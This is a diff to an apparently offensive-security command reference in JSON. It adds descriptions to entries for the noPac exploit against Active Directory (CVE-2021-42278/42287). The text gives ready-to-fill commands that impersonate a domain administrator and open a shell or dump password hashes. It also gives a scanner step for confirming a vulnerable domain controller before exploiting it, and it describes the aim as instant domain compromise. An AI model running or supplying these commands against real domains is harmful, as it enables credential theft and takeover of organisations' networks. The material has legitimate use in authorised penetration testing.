@@ -172,11 +172,13 @@
   "variations": [
     {
       "label": "Exploit -> impersonate DA + shell",
-      "command": "python3 noPac.py <domain>/<user>:<password> -dc-ip <dc_ip> -dc-host <dc_hostname> -shell --impersonate administrator"
+      "command": "python3 noPac.py <domain>/<user>:<password> -dc-ip <dc_ip> -dc-host <dc_hostname> -shell --impersonate administrator",
+      "description": "Exploit -> impersonate DA + shell. See the command syntax for exact parameters and flags."
     },
     {
       "label": "Exploit -> dump hashes",
-      "command": "python3 noPac.py <domain>/<user>:<password> -dc-ip <dc_ip> -dc-host <dc_hostname> --impersonate administrator -dump"
+      "command": "python3 noPac.py <domain>/<user>:<password> -dc-ip <dc_ip> -dc-host <dc_hostname> --impersonate administrator -dump",
+      "description": "Exploits the noPac/sAMAccountName spoofing vulnerability (CVE-2021-42278/42287) to impersonate a domain controller and dump password hashes. Chains machine account manipulation with S4U2self for instant domain compromise."
     }
   ],
   "explain": "Checks whether a domain is vulnerable to NoPac (CVE-2021-42278 + CVE-2021-42287) with only LDAP queries:\n  scanner.py <domain>/<user>:<password>   authenticate as any domain user\n  -dc-ip <dc_ip>   the Domain Controller to test\n  -use-ldap        query over LDAP (quiet - no exploitation)\nPrints the domain SID and confirms if the DC can be impersonated; run it before noPac.py so you only fire the exploit against a confirmed-vulnerable DC."
